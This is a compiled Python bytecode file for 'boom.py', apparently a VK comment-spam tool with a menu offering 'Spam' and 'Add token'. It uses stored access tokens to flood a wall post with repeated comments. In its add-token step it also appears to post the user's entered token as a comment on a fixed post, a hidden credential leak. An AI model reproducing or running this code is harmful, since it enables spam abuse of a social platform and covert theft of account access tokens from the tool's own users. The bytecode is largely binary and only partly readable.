U
    T�m^A  �                   @   s�  d dl Z d dlZd dlZe�d� edd�Ze��  edd�Zdd� Zdd	� Ze	d
� e
d�Zedkr�e
d�ZzRe jed�Ze jeddd�Zejjdded� edd�Ze�ed � e��  W n   e	d� Y nX e	d� e�  nedkr�e	d� e�  e� Ze
d�Ze	d� e
d�Ze	d� edk�r2dZnedk�rBdZnedk�rPd Ze	d� e� Zed!k�rl�q�d Zzhej�� d  d" Zejjed d# ed  d$�d  d% Zeed �ek�s�eek�r�W �qXe� d&� W n   Y �qXY nX zHejjeed �eed �ed� ejjeed �eed �ed� W n   e	d'� Y �qXY nX ed k�rle	d(� ed7 ZnNedk�r�e	d)� ed7 Zn2edk�r�e	d*� ed7 Znedk�r�e	d+� d Ze� ee�� �qp�qXe	d,� dS )-�    N�clearz.tokensza+�rc                  C   sH   t �� } | d t| �d � } | dkr(dS tj| d�}tj|ddd�S d S )N�   � T�Zaccess_token�5.92�ru��vZlang)�f�readline�len�vk�Session�API)�token�session� r   �boom.py�login   s    r   c                  C   s  d} d}d}d}d}t d�}tt|��D ]�}|| dkr@|d } || k rJq(|dkr�| dkr�z4|| dkrp|d7 }t|| � d}||| 7 }W q�   ||| 7 }Y q�X q(|dkr�|| dkr�||| 7 }q�d	}q(|d	kr(||| 7 }q(|dks�|dk�rtd
� t�  |||fS )Nr   r   z[35mEnter the link: [0m�.�   �-r   �_�   z
[31mInvalid link
)�input�ranger   �int�print�quit)Zspace�step�typeZfirstIDZsecondIDZlink�charr   r   r   �getlink   s>    r#   u  [37m
 InvertedOnes          Vk: @inverted_ones[32m
 ┏━━┳━━┳━━┳━━┓  ┏━━━━━┳━━━━━┳━━━━━┳━━┳━━┓
 ┃  ┃  ┃    ┏┛  ┃  ━  ┃     ┃     ┃     ┃
 ┃  ┃  ┃   ━┻┓  ┃    ━┫  ┃  ┃  ┃  ┃     ┃
 ┃    ┏┫     ┃  ┃  ━  ┃     ┃     ┃ ┃ ┃ ┃
 ┗━━━━┛┗━━┻━━┛  ┗━━━━━┻━━━━━┻━━━━━┻━┻━┻━┛
[35m
[1] Spam
[2] Add token
z&Please, enter your task's number: [0m�2z[35mEnter the token: [0mr   r   r   r	   i
��r   )Zowner_idZpost_id�message�a�
z
[31mInvalid tokenr   �1z
[31mInvalid task's number
z![35mMessage for commentary:[0m zE[35m
--SPEED--[0m
[1] - 1.0
[2] - 0.5
[3] - 0.2[35m
---------[0m
z[35mSpeed:[0m r   �   r   T�idr   )ZpostsZfrom_idg      �?z[Fz[FCommenting                 z[FCommenting.                z[FCommenting..               z[FCommenting...              z#[F                                )!r   �time�os�system�openr   �closer   r#   r   r   ZtaskZtkr   r   r   ZapiZwallZcreateComment�w�writer   Z	parametrsZmessZspeedZdowZusers�getr*   ZgetByIdZcreatorr   �sleepr   r   r   r   �<module>   s�   


	"




&"&






